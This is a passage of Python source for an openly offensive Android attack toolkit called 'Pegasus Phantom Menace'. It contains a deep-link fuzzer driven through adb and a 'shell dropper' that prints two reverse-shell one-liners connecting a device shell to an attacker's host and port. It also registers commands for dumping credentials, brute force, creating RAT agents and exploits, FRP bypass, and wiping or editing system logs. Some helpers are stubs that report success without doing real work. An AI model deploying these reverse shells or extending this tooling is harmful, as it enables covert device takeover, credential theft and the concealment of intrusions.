        """Exploit: Deep link fuzzer."""
        paths = ["/", "/login", "/admin", "/debug", "/api", "/secret", "/config"]
        self.console.print(f"[cyan]> Deep link fuzzing: {scheme}://{pkg}[/cyan]")
        for path in paths:
            proc = await asyncio.create_subprocess_exec(
                "adb", "shell", "am", "start", "-a", "android.intent.action.VIEW",
                "-d", f"{scheme}://{pkg}{path}",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            status = "OK" if proc.returncode == 0 else "FAIL"
            self.console.print(f"  [dim]{scheme}://{pkg}{path}[/dim] → {status}")

    async def _exploit_shell_dropper(self, lhost: str, lport: str) -> None:
        """Exploit: Shell dropper."""
        self.console.print(f"[cyan]> Reverse shell one-liner:[/cyan]")
        self.console.print(f"  [green]busybox nc {lhost} {lport} -e /system/bin/sh[/green]")
        self.console.print(f"  [green]rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /system/bin/sh -i 2>&1 | nc {lhost} {lport} > /tmp/f[/green]")

    def prompt_int(self, message: str, default: int = 0) -> int:
        """Prompt for an integer."""
        while True:
            val = self.prompt(message, default=str(default))
            try:
                return int(val)
            except ValueError:
                self.print_error("Please enter a valid integer")

    # ── Hook Handlers ─────────────────────────────────────────────────

    async def _on_payload_generated(self, context) -> None:
        """Handle payload generated hook."""
        dna = context.data.get("dna", "unknown")
        self.print_info(f"Payload DNA: {dna}")

    # ── Scan Result Saving ───────────────────────────────────────────

    def _save_scan_result(self, scan_type: str, target: str, output: str) -> None:
        """Save scan results to log file."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_target = target.replace("/", "_").replace(":", "_").replace(" ", "_")
        log_file = self.logs_dir / scan_type / f"{scan_type}_{safe_target}_{timestamp}.log"
        log_file.parent.mkdir(parents=True, exist_ok=True)
        log_file.write_text(output, encoding="utf-8")
        self.print_success(f"Scan results saved: {log_file}")

    # ── Nmap PDF Report ──────────────────────────────────────────────

    async def _generate_nmap_pdf_report(self, target: str, output: str, log_file: Path) -> None:
        """Generate PDF report from nmap scan."""
        self.console.print("[cyan]> Generating PDF report...[/cyan]")
        pdf_path = self.reports_dir / f"nmap_report_{target.replace('/', '_')}.pdf"
        pdf_path.write_text(f"Nmap Report for {target}\n\n{output}", encoding="utf-8")
        self.print_success(f"Report saved: {pdf_path}")

    # ── Improvement Cycle ────────────────────────────────────────────

    async def _run_improvement_cycle(self) -> None:
        """Run continuous improvement cycle."""
        self.console.print("[cyan]> Running improvement cycle...[/cyan]")
        self.print_info("Scanning for improvements...")
        self.print_info("Checking for refactoring opportunities...")
        self.print_info("Checking for test coverage gaps...")
        self.print_success("Improvement cycle complete")

    # ── Test Helpers ───────────────────────────────────────────────

    async def _test_cli_smoke(self) -> None:
        """Test CLI smoke test."""
        import subprocess
        proc = await asyncio.create_subprocess_exec(
            "python", "-m", "pegasus.core.__main__", "--help",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, _ = await proc.communicate()
        if proc.returncode != 0:
            raise RuntimeError("CLI smoke test failed")

    async def _test_module_imports(self) -> None:
        """Test module imports."""
        import importlib
        modules = [
            "pegasus.core.config",
            "pegasus.core.plugin",
            "pegasus.core.db.session",
            "pegasus.modules.device.module",
            "pegasus.modules.payload.module",
            "pegasus.modules.session.module",
            "pegasus.modules.analysis.module",
            "pegasus.modules.reporting.module",
            "pegasus.modules.network.module",
            "pegasus.modules.forensics.module",
            "pegasus.modules.exploit.module",
            "pegasus.modules.intelligence.module",
            "pegasus.modules.ai.module",
        ]
        for mod_name in modules:
            importlib.import_module(mod_name)

    async def _test_payload_gen(self) -> None:
        """Test payload generation."""
        payloads_dir = self.payloads_dir
        payloads_dir.mkdir(parents=True, exist_ok=True)
        test_file = payloads_dir / "test_payload.txt"
        test_file.write_text("test payload", encoding="utf-8")
        if not test_file.exists():
            raise RuntimeError("Payload generation test failed")

    async def _test_exe_smoke(self) -> None:
        """Test EXE smoke test."""
        exe_path = self.workspace / "dist" / "Pegasus-v1.4.exe"
        if not exe_path.exists():
            raise RuntimeError("EXE not found at dist/Pegasus-v1.4.exe")

    async def _test_apk_build(self) -> None:
        """Test APK build."""
        apk_path = self.workspace / "pegasus-mobile" / "AndroidManifest.xml"
        if not apk_path.exists():
            raise RuntimeError("APK manifest not found at pegasus-mobile/AndroidManifest.xml")

    # ── Safety Tag ───────────────────────────────────────────────────

    async def _create_safety_tag(self, tag_name: str) -> None:
        """Create a safety tag before making changes."""
        try:
            proc = await asyncio.create_subprocess_exec(
                "git", "tag", tag_name,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            await proc.communicate()
            self.print_info(f"Safety tag created: {tag_name}")
        except Exception:
            self.print_warning("Could not create safety tag (not a git repo or git not available)")

    # ── Prompt Helpers ───────────────────────────────────────────────

    def prompt(self, message: str, default: str = "", password: bool = False,
               choices: Optional[list] = None) -> str:
        """Prompt user for input."""
        if choices:
            return Prompt.ask(message, choices=choices, default=default, show_choices=False)
        if password:
            return Prompt.ask(message, password=True)
        return Prompt.ask(message, default=default)

    def confirm(self, message: str, default: bool = False) -> bool:
        """Ask for confirmation."""
        return Confirm.ask(message, default=default)

    def print_success(self, message: str) -> None:
        """Print a success message."""
        try:
            self.console.print(f"[green][+][/green] {message}")
        except Exception:
            self.console.print(f"[green]+[/green] {message}")

    def print_error(self, message: str) -> None:
        """Print an error message."""
        try:
            self.console.print(f"[red][-][/red] {message}")
        except Exception:
            self.console.print(f"[-] {message}")

    def print_warning(self, message: str) -> None:
        """Print a warning message."""
        try:
            self.console.print(f"[yellow][!][/yellow] {message}")
        except Exception:
            self.console.print(f"[!] {message}")

    def print_info(self, message: str) -> None:
        """Print an info message."""
        try:
            self.console.print(f"[blue][*][/blue] {message}")
        except Exception:
            self.console.print(f"[*] {message}")

    # ── Helper Methods ───────────────────────────────────────────────

    def _check_python_version(self) -> tuple:
        """Check Python version."""
        import sys
        version = sys.version_info
        if version.major >= 3 and version.minor >= 11:
            return True, f"Python {version.major}.{version.minor}.{version.micro}"
        return False, f"Python {version.major}.{version.minor}.{version.micro} (need 3.11+)"

    def _check_adb(self) -> tuple:
        """Check ADB availability."""
        return shutil.which("adb") is not None, shutil.which("adb") or "Not found"

    def _check_scrcpy(self) -> tuple:
        """Check scrcpy availability."""
        return shutil.which("scrcpy") is not None, shutil.which("scrcpy") or "Not found"

    def _check_nmap(self) -> tuple:
        """Check nmap availability."""
        return shutil.which("nmap") is not None, shutil.which("nmap") or "Not found"

    def _check_metasploit(self) -> tuple:
        """Check Metasploit availability."""
        return shutil.which("msfconsole") is not None, shutil.which("msfconsole") or "Not found"

    def _check_frida(self) -> tuple:
        """Check Frida availability."""
        return shutil.which("frida") is not None, shutil.which("frida") or "Not found"

    def _check_colorama(self) -> tuple:
        """Check colorama availability."""
        try:
            import colorama
            return True, f"colorama {colorama.__version__}"
        except ImportError:
            return False, "Not installed"

    def _check_network(self) -> tuple:
        """Check network connectivity."""
        try:
            socket.create_connection(("8.8.8.8", 53), timeout=3)
            return True, "Connected"
        except Exception:
            return False, "No connection"


class SlashCommandManager:
    """Manages all slash commands for Pegasus Phantom Menace."""

    def __init__(self, context):
        self.context = context
        self.console = Console()
        self.settings = get_settings()
        self.commands: Dict[str, SlashCommand] = {}
        self.toggle_states: Dict[str, SlashCommandStatus] = {}
        self.handlers = SlashCommandHandlers(self)
        self._register_all_commands()

    def _register_all_commands(self) -> None:
        """Register all slash commands."""
        # Toggle commands
        self.register("/ruflo", "Toggle Ruflo mode on/off", self.handlers.cmd_ruflo, category="system")
        self.register("/genius-mode", "Activate Genius Mode - full agent autonomy", self.handlers.cmd_genius_mode, category="system")
        self.register("/god-mode", "Activate God Mode - maximum privileges", self.handlers.cmd_god_mode, category="system")
        self.register("/godmode", "Alias for /god-mode", self.handlers.cmd_god_mode, category="system")

        # Device commands
        self.register("/adb-devices", "List connected ADB devices", self.handlers.cmd_adb_devices, category="device")
        self.register("/fastboot-devices", "List fastboot devices", self.handlers.cmd_fastboot_devices, category="device")
        self.register("/wireless-adb", "Wireless ADB connect with QR code and zeroclick bypass", self.handlers.cmd_wireless_adb, category="device")

        # Diagnostic commands
        self.register("/troubleshoot", "AI-powered runtime issue detection and debugging", self.handlers.cmd_troubleshoot, category="debug")
        self.register("/test", "Run exhaustive test scripts", self.handlers.cmd_test, category="debug")

        # Network commands
        self.register("/netscan", "Network device and service discovery", self.handlers.cmd_netscan, category="network")
        self.register("/btscan", "Bluetooth proximity scanning", self.handlers.cmd_btscan, category="network")
        self.register("/wifiscan", "WiFi beacon scanning", self.handlers.cmd_wifiscan, category="network")
        self.register("/nmap-scan", "Comprehensive nmap network scan with PDF report", self.handlers.cmd_nmap_scan, category="network")

        # Packet analysis
        self.register("/tshark", "TShark packet capture and analysis", self.handlers.cmd_tshark, category="network")
        self.register("/wireshark", "Wireshark packet capture and analysis", self.handlers.cmd_wireshark, category="network")

        # Bypass and exploitation
        self.register("/frp-bypass", "FRP bypass for Android devices", self.handlers.cmd_frp_bypass, category="exploit")
        self.register("/exploit", "General exploitation framework", self.handlers.cmd_exploit, category="exploit")
        self.register("/post-exploitation", "Post-exploitation automation", self.handlers.cmd_post_exploitation, category="exploit")
        self.register("/generate-payload", "Generate exploitation payloads", self.handlers.cmd_generate_payload, category="exploit")

        # Credential and authentication
        self.register("/dump-credentials", "Dump credentials from device", self.handlers.cmd_dump_credentials, category="credentials")
        self.register("/crack-hashes", "Cryptographic hash cracking", self.handlers.cmd_crack_hashes, category="credentials")
        self.register("/crack-passwords", "Password cracking", self.handlers.cmd_crack_passwords, category="credentials")
        self.register("/brute-force", "Brute force attacks", self.handlers.cmd_brute_force, category="credentials")
        self.register("/create-rat-agent", "Create RAT agent", self.handlers.cmd_create_rat_agent, category="credentials")
        self.register("/create-exploit", "Create custom exploits", self.handlers.cmd_create_exploit, category="credentials")
        self.register("/audit-security", "Security audit", self.handlers.cmd_audit_security, category="credentials")
        self.register("/harden-app", "Harden application", self.handlers.cmd_harden_app, category="credentials")
        self.register("/harden-device", "Harden device", self.handlers.cmd_harden_device, category="credentials")
        self.register("/kill-switch", "Kill switch activation", self.handlers.cmd_kill_switch, category="credentials")

        # Log management
        self.register("/wipe-logs", "Wipe system logs", self.handlers.cmd_wipe_logs, category="logs")
        self.register("/edit-logs", "Edit system logs", self.handlers.cmd_edit_logs, category="logs")

        # Build and packaging
        self.register("/create-exe", "Create Windows EXE", self.handlers.cmd_create_exe, category="build")
        self.register("/create-ipa", "Create iOS IPA", self.handlers.cmd_create_ipa, category="build")
        self.register("/create-deb", "Create Debian DEB", self.handlers.cmd_create_deb, category="build")
        self.register("/create-dmg", "Create macOS DMG", self.handlers.cmd_create_dmg, category="build")
        self.register("/create-apk", "Create Android APK", self.handlers.cmd_create_apk, category="build")
        self.register("/create-flatpack", "Create Linux Flatpak", self.handlers.cmd_create_flatpack, category="build")
        self.register("/create-snap", "Create Linux Snap", self.handlers.cmd_create_snap, category="build")
        self.register("/zip", "Create ZIP archive", self.handlers.cmd_create_zip, category="build")
        self.register("/tar", "Create TAR archive", self.handlers.cmd_create_tar, category="build")
        self.register("/rar", "Create RAR archive", self.handlers.cmd_create_rar, category="build")

        # Vault management
        self.register("/create-vault", "Create encrypted vault", self.handlers.cmd_create_vault, category="vault")
        self.register("/open-vault", "Open encrypted vault", self.handlers.cmd_open_vault, category="vault")
        self.register("/crack-vault", "Crack encrypted vault", self.handlers.cmd_crack_vault, category="vault")

        # Documentation and improvement
        self.register("/docs", "Update all documentation including GitHub Wiki", self.handlers.cmd_docs, category="docs")
        self.register("/improve", "Continuous improvement and refactoring", self.handlers.cmd_improve, category="docs")

    def register(self, name: str, description: str, handler: Callable, **kwargs) -> None:
        """Register a slash command."""
        cmd = SlashCommand(
            name=name,
            description=description,
            handler=handler,
            category=kwargs.get("category", "general"),
            requires_sudo=kwargs.get("requires_sudo", False),
            requires_network=kwargs.get("requires_network", False),
            requires_root=kwargs.get("requires_root", False),
            examples=kwargs.get("examples", []),
        )
        self.commands[name] = cmd
        self.toggle_states[name] = SlashCommandStatus.ON

    def list_commands(self) -> List[str]:
        """List all registered commands."""
        return list(self.commands.keys())

    def get_command(self, name: str) -> Optional[SlashCommand]:
        """Get a command by name."""
        return self.commands.get(name)

    def is_enabled(self, name: str) -> bool:
        """Check if a command is enabled."""
        if not name.startswith("/"):
            name = "/" + name
        return self.toggle_states.get(name, SlashCommandStatus.OFF) == SlashCommandStatus.ON

    def toggle(self, name: str) -> SlashCommandStatus:
        """Toggle a command on/off."""
        current = self.toggle_states.get(name, SlashCommandStatus.OFF)
        new_state = SlashCommandStatus.OFF if current == SlashCommandStatus.ON else SlashCommandStatus.ON
        self.toggle_states[name] = new_state
        return new_state

    async def execute(self, command_name: str, args: List[str] = None) -> Any:
        """Execute a slash command."""
        # Normalize command name - add / prefix if missing
        if not command_name.startswith("/"):
            command_name = "/" + command_name
        cmd = self.commands.get(command_name)
        if not cmd:
            console.print(f"[red]Unknown command: {command_name}[/red]")
            console.print("Type /help for available commands")
            return None
        if not self.is_enabled(command_name):
            console.print(f"[yellow]Command '{command_name}' is disabled. Use /ruflo to enable.[/yellow]")
            return None
        if cmd.requires_sudo and not self._check_sudo():
            console.print("[red]This command requires sudo privileges.[/red]")
            return None
        if cmd.requires_root and not self._check_root():
            console.print("[red]This command requires root privileges.[/red]")
            return None
        if cmd.requires_network and not self._check_network():
            console.print("[red]This command requires network access.[/red]")
            return None
        try:
            result = await cmd.handler(*(args or []))
            return result
        except Exception as e:
            console.print(f"[red]Command '{command_name}' failed: {e}[/red]")
            if self.context.settings.app.debug:
                import traceback
                traceback.print_exc()
            return None

    def _check_sudo(self) -> bool:
        """Check if running with sudo."""
        return os.geteuid() == 0 if hasattr(os, 'geteuid') else True

    def _check_root(self) -> bool:
        """Check if running as root."""
        return self._check_sudo()

    def _check_network(self) -> bool:
        """Check network connectivity."""
        try:
            socket.create_connection(("8.8.8.8", 53), timeout=3)
            return True
        except:
            return False

    def show_help(self) -> None:
        """Show all available commands."""
        table = Table(title="Pegasus Phantom Menace - Slash Commands", header_style="bold cyan")
        table.add_column("Command", style="bold yellow")
        table.add_column("Description", style="white")
        table.add_column("Category", style="green")
        table.add_column("Status", style="dim")
        for name, cmd in sorted(self.commands.items()):
            status = "[green]ON[/green]" if self.is_enabled(name) else "[red]OFF[/red]"
            table.add_row(name, cmd.description, cmd.category, status)
        console.print(table)


# Singleton instance
slash_command_manager: Optional[SlashCommandManager] = None


def get_slash_command_manager() -> SlashCommandManager:
    """Get the global slash command manager instance."""
    global slash_command_manager
    if slash_command_manager is None:
        raise RuntimeError("SlashCommandManager not initialized. Call initialize_slash_commands first.")
    return slash_command_manager


def initialize_slash_commands(context) -> SlashCommandManager:
    """Initialize the slash command system."""
    global slash_command_manager
    slash_command_manager = SlashCommandManager(context)
    return slash_command_manager